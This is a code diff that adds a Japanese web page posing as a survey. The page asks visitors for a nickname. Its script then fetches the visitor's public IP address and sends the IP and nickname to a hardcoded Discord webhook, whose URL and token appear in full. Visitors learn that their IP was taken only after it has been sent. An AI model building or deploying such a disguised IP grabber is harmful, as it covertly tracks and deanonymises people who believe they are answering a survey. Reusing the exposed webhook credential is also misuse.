@@ -1,1 +1,125 @@
-# like.github.io
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>アンケート</title>
+    <!-- Tailwind CSS CDNを読み込み -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Interフォントを適用 */
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <!-- メインコンテナ -->
+    <div class="bg-white p-8 rounded-2xl shadow-lg w-full max-w-md mx-auto">
+        <h1 class="text-2xl font-bold text-center text-gray-800 mb-6">名前を入力してボタンを押してください！</h1>
+        <form name="myform" class="space-y-4">
+            <!-- 名前入力フィールド -->
+            <div>
+                <label for="namaeInput" class="block text-sm font-medium text-gray-700 mb-1">名前:</label>
+                <input
+                    type="text"
+                    id="namaeInput"
+                    name="namae"
+                    size="20"
+                    placeholder="ここにニックネームを入力"
+                    class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-gray-900"
+                />
+            </div>
+            <!-- 決定ボタン -->
+            <button
+                type="button"
+                onclick="getIPAddress()"
+                class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded-lg shadow-md transition duration-300 ease-in-out transform hover:scale-105"
+            >
+                決定
+            </button>
+        </form>
+
+        <!-- メッセージ表示エリア -->
+        <div id="messageArea" class="mt-6 text-center text-gray-700 text-lg font-medium">
+            <!-- ここにIP取得完了メッセージが表示されます -->
+        </div>
+    </div>
+
+    <script>
+        // IPアドレスを取得し、Discordに送信する関数
+        function getIPAddress() {
+            // ここでフォームから名前の値を安全に取得します。
+            // DOM要素がロードされた後に実行されるため、undefinedになることはありません。
+            const namaeInput = document.getElementById('namaeInput');
+            const namae = namaeInput.value.trim(); // 前後の空白を削除
+
+            // 名前が入力されていない場合のバリデーション
+            if (!namae) {
+                displayMessage("ニックネームを入力してください。", "text-red-600");
+                return;
+            }
+
+            displayMessage("IPアドレスを取得中...", "text-gray-500");
+
+            fetch("https://api.ipify.org?format=json")
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTPエラー！ステータス: ${response.status}`);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    const ipAddress = data.ip;
+                    sendToDiscord(namae, ipAddress); // 取得したIPアドレスと名前を送信
+                })
+                .catch(error => {
+                    console.error("IPアドレスの取得に失敗しました:", error);
+                    displayMessage(`IPアドレスの取得に失敗しました: ${error.message}`, "text-red-600");
+                });
+        }
+
+        // WebhookにIPアドレスと名前を送信する関数
+        function sendToDiscord(namae, ipAddress) {
+            // ここにDiscord WebhookのURLを入力してください。
+            // 注意: このURLは公開環境では直接含めない方が安全です。
+            const webhookURL = "https://discord.com/api/webhooks/1385521042675728446/537quNdmzXbfcdXxiIuN-s4tJqi1UGK1FP2NRp_KKoIsYMoIkewRymXrqAn966583KzV";
+
+            const payload = {
+                embeds: [{
+                    title: `${namae} のIP取得`, // ここでnamaeを使用
+                    description: `IPアドレス: ${ipAddress}`,
+                    color: 3447003 // 青色に設定
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error("Discordへの送信に失敗しました:", response.status, response.statusText);
+                    // エラーレスポンスのボディをログに出力（詳細なエラー情報のため）
+                    return response.text().then(text => { throw new Error(`送信失敗: ${text}`); });
+                }
+                displayMessage("IPの取得とDiscordへの送信が完了しました！Develop by a", "text-green-600");
+            })
+            .catch(error => {
+                console.error("Discordへの送信に失敗しました:", error);
+                displayMessage(`Discordへの送信に失敗しました: ${error.message}`, "text-red-600");
+            });
+        }
+
+        // メッセージをHTMLに表示するヘルパー関数
+        function displayMessage(message, colorClass = "text-gray-700") {
+            const messageArea = document.getElementById('messageArea');
+            messageArea.innerHTML = message;
+            messageArea.className = `mt-6 text-center text-lg font-medium ${colorClass}`;
+        }
+    </script>
+</body>
+</html>
